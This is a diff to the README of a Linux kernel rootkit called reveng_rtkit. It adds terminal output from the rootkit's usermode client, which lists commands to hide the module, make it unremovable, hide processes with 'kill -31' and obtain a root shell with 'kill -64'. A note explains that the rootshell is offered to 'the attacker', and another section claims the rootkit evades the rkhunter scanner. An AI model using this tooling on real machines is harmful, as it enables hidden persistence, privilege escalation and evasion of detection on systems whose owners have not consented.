@@ -85,12 +85,81 @@ $ kill -64 <any pid>
 ```
 ![Screenshot from 2022-02-25 20-45-45](https://user-images.githubusercontent.com/61424547/155755082-d6ced40f-e0b0-47a3-8029-4f26b322df29.png)
 
+- To remove this rootkit module: 1stly make module visible via `show` command using client_usermode file as reveng_rtkit while loading hides itself from being revealed (also change to `remove` mode, if you have made rootkit module to `protect` mode).
+```
+reveng007@ubuntoo ~/D/k/B/L/x/1/g/kernel_src> sudo ../user_src/client_usermode
+[sudo] password for reveng007: 
+
+
+[+] Created by @reveng007(Soumyanil)
+
+
+|+++++++++++++++++++ Available commands ++++++++++++++++++|
+
+hide		: Command to hide rootkit 
+		=> In this mode, in no way this rootkit be removable
+
+show		: Command to unhide rootkit 
+		=> In this mode, rootkit_protect and rootkit_remove will work effectively
+
+protect		: Command to make rootkit unremovable (even if it can be seen in usermode)
+
+remove		: Command to make rootkit removable
+
+kill -31 <pid>	: Command to hide/unhide running process. Applicable in normal shell prompt.
+		=> write: `process` in the below prompt to close without any error
+
+kill -64 <any pid>	: Command to get rootshell. Applicable in normal shell prompt.
+		=> write: `root` in the below prompt to close without any error
+
+
+[+] Driver file opened
+[?] Enter the Value to send: show
+[+] Written Value to Device file
+[*] Reading Value from Device file: Value present in Device: show
+
+[+] Device file closed
+reveng007@ubuntoo ~/D/k/B/L/x/1/g/kernel_src> sudo ../user_src/client_usermode
+
+
+[+] Created by @reveng007(Soumyanil)
+
+
+|+++++++++++++++++++ Available commands ++++++++++++++++++|
+
+hide		: Command to hide rootkit 
+		=> In this mode, in no way this rootkit be removable
+
+show		: Command to unhide rootkit 
+		=> In this mode, rootkit_protect and rootkit_remove will work effectively
+
+protect		: Command to make rootkit unremovable (even if it can be seen in usermode)
+
+remove		: Command to make rootkit removable
+
+kill -31 <pid>	: Command to hide/unhide running process. Applicable in normal shell prompt.
+		=> write: `process` in the below prompt to close without any error
+
+kill -64 <any pid>	: Command to get rootshell. Applicable in normal shell prompt.
+		=> write: `root` in the below prompt to close without any error
+
+
+[+] Driver file opened
+[?] Enter the Value to send: remove
+[+] Written Value to Device file
+[*] Reading Value from Device file: Value present in Device: remove
+
+[+] Device file closed
+```
 #### NOTE:
  This rootkit is capable of providing rootshell to only bash and sh shell, not others. Although, it is possible for other shells as well but with some tricks. We can use system() C function alike function in Linux Kernel programming, so that we 1st trigger a bash/sh shell then offer rootshell to the attacker. I  have'nt got that type of kernel function till now, but as soon as I get it, I will add it up. If anybody viewing this know about this, or interested to contribute, are most welcome to make a pull request.
 
 ### Bypassing ***rkhunter*** antirootkit:
 
-Here is the log file, that was generated: (file)[]
+Here is the log file, that was generated: [file](https://github.com/reveng007/reveng_rtkit/blob/main/rkhunter.log)
+Two warnings are present:
+1. Checking for suspicious (large) shared memory segments: For Notable markdown editor (This is not a threat lol!)
+2. /usr/bin/lwp-request : [stackexchange](https://unix.stackexchange.com/questions/373718/rkhunter-gives-me-a-warning-for-usr-bin-lwp-request-what-should-i-do-debi)
 
 ### To-Do list :man_mechanic::
 - Adding system() C function alike function in Linux Kernel programming, in order to open a new bash/sh prompt.
